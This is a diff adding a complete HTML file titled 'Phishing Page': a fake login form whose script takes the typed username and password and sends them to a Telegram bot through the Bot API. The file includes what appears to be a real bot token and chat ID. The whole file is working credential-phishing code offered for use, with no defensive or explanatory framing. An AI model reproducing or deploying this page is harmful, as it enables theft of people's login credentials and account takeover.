@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phishing Page</title>
+</head>
+<body>
+    <h1>Login</h1>
+    <form id="phishingForm">
+        <input type="text" id="username" placeholder="Enter Username" required>
+        <input type="password" id="password" placeholder="Enter Password" required>
+        <button type="submit">Login</button>
+    </form>
+
+    <script>
+        document.getElementById('phishingForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent form submission
+
+            // Get the username and password from the form
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Your bot's Telegram chat ID
+            var chat_id = "1876318259";  // Replace with your actual chat ID
+
+            // Your bot's API token
+            var api_token = "7618398792:AAG5UD5PSNu3VQ14YqV7hB9MKt4BmHRHlpQ";  // Replace with your actual bot token
+
+            // Construct the message
+            var message = `Username: ${username}\nPassword: ${password}`;
+
+            // Construct the URL to send the message to Telegram API
+            var url = `https://api.telegram.org/bot${api_token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            // Send the message to Telegram using the fetch API
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("Message sent successfully");
+                    } else {
+                        console.log("Error sending message");
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+    </script>
+</body>
+</html>
